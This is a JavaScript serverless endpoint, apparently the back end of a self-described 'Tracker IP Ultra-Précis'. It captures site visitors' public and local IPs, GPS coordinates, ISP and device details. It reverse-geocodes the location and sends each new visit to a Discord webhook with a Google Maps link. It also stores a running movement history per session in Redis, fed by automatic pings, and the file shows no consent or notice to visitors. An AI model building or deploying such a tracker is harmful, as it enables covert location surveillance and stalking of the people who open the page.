import { createClient } from 'redis';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  // Connexion Redis/KV
  const redisUrl = process.env.REDIS_URL || process.env.KV_URL;
  let client = null;

  if (redisUrl) {
    client = createClient({ 
      url: redisUrl,
      socket: {
        connectTimeout: 5000,
        reconnectStrategy: false
      }
    });
    client.on('error', (err) => console.error('Redis Client Error', err));
    try {
      await client.connect();
    } catch (e) {
      console.error("Échec connexion Redis dans log.js:", e);
      client = null; // On continue sans Redis pour Discord
    }
  }

  const forwarded = req.headers['x-forwarded-for'];
  const publicIp = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
  
  let geo = {};
  try {
    // Utilisation d'un service plus précis avec plus de détails
    const geoRes = await fetch(`http://ip-api.com/json/${publicIp}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
    geo = await geoRes.json();
  } catch (e) {
    console.error("Erreur géo:", e);
  }

  const { sessionId, isUpdate, forceDiscord, localIp, preciseLocation, deviceStats, userAgent, language, screenResolution, referrer, page } = req.body;

  // --- FILTRAGE DES INFOS BIDON ---
  let validatedLocalIp = localIp;
  if (localIp && (localIp === '192.0.0.2' || localIp.includes('.local') || localIp === '0.0.0.0')) {
    validatedLocalIp = "Indéterminée (Masquée)";
  }

  // Validation stricte de la localisation précise
  const hasGps = preciseLocation && typeof preciseLocation.lat === 'number' && typeof preciseLocation.lon === 'number' && preciseLocation.lat !== 0;

  let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
  
  // Si on a le GPS, on essaie de trouver le nom de la ville réelle (Reverse Geocoding)
  if (hasGps) {
    try {
      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.lat}&lon=${preciseLocation.lon}`, {
        headers: { 'User-Agent': 'SaadaaTracker/1.0' }
      });
      const revData = await revRes.json();
      if (revData && revData.address) {
        const city = revData.address.city || revData.address.town || revData.address.village || revData.address.municipality;
        const county = revData.address.county || revData.address.state;
        displayLocation = `📍 ${city || 'Ville inconnue'} (${county || ''}), ${revData.address.country}`;
      }
    } catch (e) {
      console.error("Erreur reverse géo:", e);
      displayLocation = `✅ GPS PRÉCIS (Coordonnées OK)`;
    }
  }

  const logEntry = {
    sessionId: sessionId || 'unknown',
    isUpdate: !!isUpdate,
    forceDiscord: !!forceDiscord,
    timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
    unixTime: Date.now(),
    publicIp,
    localIp: validatedLocalIp,
    location: displayLocation,
    isp: geo.isp || 'ISP inconnu',
    coords: hasGps ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
    accuracy: hasGps ? preciseLocation.accuracy : null,
    deviceStats: deviceStats || {},
    isPrecise: hasGps,
    userAgent,
    language,
    screenResolution,
    referrer,
    page: page || 'Inconnue'
  };

  console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));

  // Envoi vers Discord (Si première visite OU si forcé par l'admin)
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  const shouldSendToDiscord = webhookUrl && (
    logEntry.forceDiscord === true || 
    isUpdate === false || 
    isUpdate === undefined || 
    isUpdate === "false"
  );

  if (shouldSendToDiscord) {
    const cleanCoords = logEntry.coords.replace(/\s/g, '');
    const mapsLink = `https://www.google.com/maps?q=${cleanCoords}`;
    
    const locValue = logEntry.isPrecise 
      ? `✅ **LOCALISATION RÉELLE (GPS)**\n**${logEntry.location}**\n\n📍 [Ouvrir dans Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
      : `❌ IP Uniquement (Approximatif)\n**${logEntry.location}**\nCoords: \`${logEntry.coords}\``;

    const fields = [
      { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
      { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
      { name: "🏠 IP Locale (Appareil)", value: `\`${validatedLocalIp}\``, inline: true },
      { name: "📍 Localisation Précise", value: locValue }
    ];

    if (!logEntry.isPrecise) {
      fields.push({ name: "📡 Fournisseur (ISP)", value: logEntry.isp });
    }

    fields.push(
      { name: "📄 Page", value: logEntry.page },
      { name: "🆔 Session", value: `\`${logEntry.sessionId}\``, inline: true }
    );

    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "🚀 Nouvelle Visite sur le Site !",
            color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500,
            fields: fields,
            footer: { text: "Tracker IP Ultra-Précis - Saadaa le Goat" }
          }]
        })
      });
    } catch (e) {
      console.error("Erreur Webhook Discord:", e);
    }
  }

  // Stockage pour le dashboard (Redis Cloud)
  if (client) {
    try {
      // VÉRIFIER SI L'IP EST TUÉE ET SI C'EST UN UPDATE
      // Les updates (pings auto) sont bloqués pour les IPs tuées (PERMANENT)
      // Mais les premières visites (isUpdate=false) passent pour permettre un retour
      const isIpKilled = await client.sIsMember('ip_kill', publicIp);
      
      if (isIpKilled && isUpdate) {
        console.log(`🚫 IP tuée (update ignoré): ${publicIp}`);
        await client.quit();
        return res.status(200).json({ success: true, ip: publicIp, message: "IP tuée - update ignoré" });
      }
      
      // 1. Log général
      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${validatedLocalIp} | Loc:${logEntry.location} | Session:${logEntry.sessionId}\n`;
      await client.lPush('visitor_logs', logLine);

      // 2. Historique de mouvement pour cette session
      const movementData = JSON.stringify({
        publicIp: publicIp,
        lat: hasGps ? preciseLocation.lat : geo.lat,
        lon: hasGps ? preciseLocation.lon : geo.lon,
        accuracy: logEntry.accuracy,
        deviceStats: logEntry.deviceStats,
        time: logEntry.timestamp,
        unixTime: logEntry.unixTime,
        isPrecise: logEntry.isPrecise,
        localIp: validatedLocalIp,
        page: logEntry.page
      });
      await client.rPush(`session_movement:${logEntry.sessionId}`, movementData);
      
      // 3. Liste des sessions actives
      // Les vraies visites (isUpdate=false) réactivent TOUJOURS la session
      // Les pings auto s'ajoutent seulement si pas tuée
      if (isUpdate === false || !isIpKilled) {
        await client.sAdd('active_sessions', logEntry.sessionId);
      }

    } catch (e) {
      console.error("Erreur Stockage Redis:", e);
    } finally {
      await client.quit();
    }
  }

  return res.status(200).json({ success: true, ip: publicIp });
}
